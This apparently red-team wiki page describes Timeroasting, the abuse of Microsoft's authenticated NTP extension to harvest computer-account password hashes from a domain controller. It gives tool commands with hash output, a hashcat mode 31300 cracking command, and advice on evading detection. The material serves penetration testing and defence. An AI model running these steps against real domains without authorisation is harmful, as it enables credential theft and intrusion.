# Timeroasting

## Description

Domain-joined computers typically synchronize their clocks using the Network Time Protocol (NTP), with a Domain Controller (DC) acting as the time source. However, traditional NTP lacks authentication, making it vulnerable to man-in-the-middle (MitM) attacks where an adversary could spoof responses and manipulate the client’s system time.

To mitigate this risk, Microsoft implemented a proprietary extension to NTP that introduces cryptographic authentication. When a computer sends an NTP request, it includes its Relative Identifier (RID) in a special extension field. The Domain Controller responds by appending a Message Authentication Code (MAC) to the response, generated using the NTLM (MD4) hash of the computer account's password as the key.

Crucially, the client does **not** need to authenticate to the DC in order to make this request. It can simply specify any RID, and the DC will look up the corresponding computer account and generate a response using its password hash.

While this design addresses time spoofing concerns, it introduces a significant security side effect: **unauthenticated clients can effectively request salted password hashes for any computer account in the domain**. In theory, this isn't a concern if all computer passwords are long, random, and machine-generated — but that's not always true in practice.

As a result, this NTP extension can be abused to harvest password-equivalent hashes for offline cracking, particularly targeting computer accounts with weak or misconfigured passwords.

**Reference:** [https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)

## Unauthenticated

As discussed in the Whitepaper, this attacks works from an unauthenticated perspective. The only slight roadblock here is that we would need to resolve the RIDs of any cracked hashes back to their respective computer name.

### Linux

Github: [https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py)

```
python3 timeroast.py 10.10.10.100
```

{% code title="Output" %}
```bash
1000:$sntp-ms$fa0df21ba416b39aa192bb06963714f4$1c0111e900000000000a649c4c4f434ceba3...
1104:$sntp-ms$d9704f7ad11724ad7bee71afbe1e5db5$1c0111e900000000000a649c4c4f434ceba3...
1165:$sntp-ms$66a3515011c09903bc16c8a2cb5c31f6$1c0111e900000000000a649d4c4f434ceba3...
1166:$sntp-ms$e704e60d2a7ee3d8792925c72d6634b9$1c0111e900000000000a649d4c4f434ceba3...
```
{% endcode %}

### Windows

Github: [https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1)

```powershell
. .\timeroast.ps1
```

{% code title="Output" %}
```powershell
1000:$sntp-ms$73d9d6aa36e20f7e6a0305de31f4caea$1c0111e900000000000a6c304c4f434ceba33c67e3304da5e1b8428bffbfcd0aeba3...
1104:$sntp-ms$e0d04e3046d323951806eebf45ba9f83$1c0111e900000000000a6c314c4f434ceba33c67e3528d6be1b8428bffbfcd0aeba3...
1165:$sntp-ms$27ce4356ae08450bab8e427fbaf07fc7$1c0111e900000000000a6c324c4f434ceba33c67e347e3c4e1b8428bffbfcd0aeba3...
1166:$sntp-ms$1187bae435e15f9aca9a032b54f13e1f$1c0111e900000000000a6c324c4f434ceba33c67e3b8c9e0e1b8428bffbfcd0aeba3...
```
{% endcode %}



## Authenticated

It's clear from the research around Timeroasting why this technique can be an attractive initial access vector, especially in scenarios where no credentials are available. However, performing Timeroasting from an _authenticated_ perspective also has its own distinct advantages.

Firstly, when authenticated, we can resolve RIDs to hostnames automatically. This significantly simplifies attribution — allowing us to map each SNTP hash back to the corresponding computer account in Active Directory.

Secondly, one could argue that Timeroasting from an authenticated context may seem redundant. After all, if our goal is to obtain hashes for computer accounts, we could simply modify tools like **Rubeus** or **Invoke-Kerberoast**, which typically filter only for user objects with Service Principal Names (SPNs). With minimal adjustments, these tools could be extended to include computer objects as well. That said, this approach is rarely used in practice, largely because computer accounts typically use long, random, and machine-generated passwords — making them infeasible to crack unless there's a misconfiguration or weak password policy in place (e.g., set during manual provisioning or imaging).

Interestingly, SNTP hashes obtained through Timeroasting can be cracked **approximately 10x faster** than traditional Kerberos 5 TGS-REP (etype 23) hashes. While this still doesn't make cracking a randomly generated machine password likely, it _does_ significantly improve the odds when weak passwords are involved — particularly in environments with lax onboarding procedures or poor password hygiene.

Lastly, requesting SPNs for all computer accounts in the domain (as done during Kerberoasting) is far noisier from an OPSEC standpoint. While Timeroasting does generate network traffic for each requested system, it's still a relatively obscure technique. As a result, it's more likely to slip under the radar of typical detection pipelines — making it an attractive alternative when stealth is more a priority.

### TL:DR

Timeroasting is a solid option for both unauthenticated and authenticated access. Authenticated use allows easier mapping of SNTP hashes to hostnames, but may seem redundant since Kerberoasting can be adapted to target computer accounts. However, SNTP hashes crack 10x faster than Kerberos TGS-REP hashes, improving chances of success against weak passwords. Plus, Timeroasting is stealthier than mass SPN enumeration, making it more OPSEC-friendly and a valuable alternative in red team ops.

Invoke-AuthenticatedTimeRoast can be used to better support timeroasting from an authenticated perspective. \
\
Github: [https://github.com/The-Viper-One/Invoke-AuthenticatedTimeRoast](https://github.com/The-Viper-One/Invoke-AuthenticatedTimeRoast)

<pre class="language-powershell"><code class="lang-powershell"><strong># Default Execution
</strong><strong>Invoke-AuthenticatedTimeRoast -DomainController 10.10.10.100
</strong><strong>
</strong><strong># Generate wordlist based on computer names
</strong>Invoke-AuthenticatedTimeRoast -DomainController 10.10.10.100 -GenerateWordlist
</code></pre>

{% code title="Output" %}
```
DC01:$sntp-ms$4b7afe1572d2d273d25ae570dd1126a7$1c0111e900000000000a6ca74c4f43...
WS01:$sntp-ms$5c475eb8012429bf9a91c96c993cfb66$1c0111e900000000000a6ca74c4f43...
Test06:$sntp-ms$7486e4dd0c30b8858c64e52b037df7fb$1c0111e900000000000a6ca74c4f43...
Test09:$sntp-ms$d4ec232496d37575b1dbe7e1ef22cd7b$1c0111e900000000000a6ca74c4f43...
```
{% endcode %}

## Hashcat

At the time of writing; the beta version of hashcat is required to crack SNPT hashes (Mode 31300).

{% hint style="warning" %}
In addition to using common wordlists and rule sets, it's important to include a wordlist of all computer names (lowercased, without the trailing `$`). This helps catch cases where the computer password matches the hostname—a pattern often seen when accounts are created using the `net computer` command or the "Assign this computer account as a pre-Windows 2000 Computer" option in the GUI.
{% endhint %}

URL: [https://hashcat.net/beta/](https://hashcat.net/beta/)

```
hashcat.exe -m 31300 -a 0 -O hashes.txt rockyou.txt --username
```

<figure><img src="../../.gitbook/assets/image (2180).png" alt=""><figcaption></figcaption></figure>

